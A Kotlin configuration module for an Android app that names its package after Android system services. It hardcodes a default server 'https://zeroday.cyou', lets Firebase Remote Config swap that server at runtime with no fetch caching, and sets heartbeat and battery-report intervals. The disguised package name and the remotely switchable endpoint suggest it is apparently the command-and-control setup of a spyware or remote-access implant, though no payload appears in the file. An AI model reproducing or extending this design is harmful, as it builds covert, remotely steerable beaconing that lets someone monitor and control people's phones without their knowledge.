package com.android.system.services

import android.content.Context
import android.util.Log
import com.google.firebase.remoteconfig.FirebaseRemoteConfig
import com.google.firebase.remoteconfig.remoteConfigSettings
import kotlinx.coroutines.suspendCancellableCoroutine
import kotlin.coroutines.resume

object ServerConfig {
    
    private const val TAG = "ServerConfig"
    private const val DEFAULT_BASE_URL = "https://zeroday.cyou"
    
    private const val KEY_BASE_URL = "base_url"
    private const val KEY_HEARTBEAT_INTERVAL = "heartbeat_interval_ms"
    private const val KEY_BATTERY_UPDATE_INTERVAL = "battery_update_interval_ms"
    
    private var cachedBaseUrl: String? = null
    private var cachedHeartbeatInterval: Long? = null
    private var cachedBatteryInterval: Long? = null
    
    private lateinit var remoteConfig: FirebaseRemoteConfig
    private var isInitialized = false
    private var isFetchComplete = false
    
    fun isInitialized(): Boolean = isInitialized
    fun isFetchComplete(): Boolean = isFetchComplete
    
    fun initialize(context: Context) {
        if (isInitialized) {
            fetchAndActivate()
            return
        }
        
        try {
            remoteConfig = FirebaseRemoteConfig.getInstance()
            
            val configSettings = remoteConfigSettings {
                minimumFetchIntervalInSeconds = 0
            }
            remoteConfig.setConfigSettingsAsync(configSettings)
            
            val defaults = mapOf(
                KEY_BASE_URL to "",
                KEY_HEARTBEAT_INTERVAL to 60000L,
                KEY_BATTERY_UPDATE_INTERVAL to 600000L
            )
            remoteConfig.setDefaultsAsync(defaults)
            
            isInitialized = true
            fetchAndActivateSync()
            
        } catch (e: Exception) {
            Log.e(TAG, "Failed to initialize Remote Config: ${e.message}", e)
            isInitialized = false
        }
    }
    
    private fun fetchAndActivateSync() {
        if (!isInitialized) {
            return
        }
        
        try {
            val task = remoteConfig.fetch(0)
            task.addOnCompleteListener { fetchTask ->
                if (fetchTask.isSuccessful) {
                    remoteConfig.activate()
                        .addOnCompleteListener { activateTask ->
                            if (activateTask.isSuccessful) {
                                isFetchComplete = true
                                
                                cachedBaseUrl = null
                                cachedHeartbeatInterval = null
                                cachedBatteryInterval = null
                            } else {
                                isFetchComplete = false
                            }
                        }
                }
            }
        } catch (e: Exception) {
            Log.e(TAG, "Error in fetchAndActivateSync: ${e.message}", e)
        }
    }
    
    fun fetchAndActivate() {
        if (!isInitialized) {
            return
        }
        
        remoteConfig.fetchAndActivate()
            .addOnCompleteListener { task ->
                if (task.isSuccessful) {
                    isFetchComplete = true
                    
                    cachedBaseUrl = null
                    cachedHeartbeatInterval = null
                    cachedBatteryInterval = null
                } else {
                    isFetchComplete = false
                }
            }
    }
    
    fun getBaseUrl(): String {
        if (cachedBaseUrl != null) {
            return cachedBaseUrl!!
        }
        
        val url = if (isInitialized) {
            try {
                val firebaseUrl = remoteConfig.getString(KEY_BASE_URL)
                if (firebaseUrl.isNotEmpty()) {
                    firebaseUrl
                } else {
                    DEFAULT_BASE_URL
                }
            } catch (e: Exception) {
                DEFAULT_BASE_URL
            }
        } else {
            DEFAULT_BASE_URL
        }
        
        cachedBaseUrl = url
        return url
    }
    
    fun getHeartbeatInterval(): Long {
        if (cachedHeartbeatInterval != null) {
            return cachedHeartbeatInterval!!
        }
        
        val interval = if (isInitialized) {
            try {
                remoteConfig.getLong(KEY_HEARTBEAT_INTERVAL)
            } catch (e: Exception) {
                60000L
            }
        } else {
            60000L
        }
        
        cachedHeartbeatInterval = interval
        return interval
    }
    
    fun getBatteryUpdateInterval(): Long {
        if (cachedBatteryInterval != null) {
            return cachedBatteryInterval!!
        }
        
        val interval = if (isInitialized) {
            try {
                remoteConfig.getLong(KEY_BATTERY_UPDATE_INTERVAL)
            } catch (e: Exception) {
                600000L
            }
        } else {
            600000L
        }
        
        cachedBatteryInterval = interval
        return interval
    }
    
    fun getString(key: String, defaultValue: String = ""): String {
        return if (isInitialized) {
            try {
                remoteConfig.getString(key).ifEmpty { defaultValue }
            } catch (e: Exception) {
                defaultValue
            }
        } else {
            defaultValue
        }
    }
    
    fun getLong(key: String, defaultValue: Long = 0L): Long {
        return if (isInitialized) {
            try {
                remoteConfig.getLong(key)
            } catch (e: Exception) {
                defaultValue
            }
        } else {
            defaultValue
        }
    }
    
    fun getBoolean(key: String, defaultValue: Boolean = false): Boolean {
        return if (isInitialized) {
            try {
                remoteConfig.getBoolean(key)
            } catch (e: Exception) {
                defaultValue
            }
        } else {
            defaultValue
        }
    }
    
    suspend fun fetchAndActivateAsync(): Boolean = suspendCancellableCoroutine { continuation ->
        if (!isInitialized) {
            continuation.resume(false)
            return@suspendCancellableCoroutine
        }
        
        remoteConfig.fetchAndActivate()
            .addOnSuccessListener { updated ->
                cachedBaseUrl = null
                cachedHeartbeatInterval = null
                cachedBatteryInterval = null
                continuation.resume(updated)
            }
            .addOnFailureListener { e ->
                continuation.resume(false)
            }
    }
    
    fun clearCache() {
        cachedBaseUrl = null
        cachedHeartbeatInterval = null
        cachedBatteryInterval = null
    }
    
    fun printAllSettings() {
        Log.d(TAG, "Base URL: ${getBaseUrl()}")
        Log.d(TAG, "Heartbeat Interval: ${getHeartbeatInterval()}ms")
        Log.d(TAG, "Battery Interval: ${getBatteryUpdateInterval()}ms")
    }
}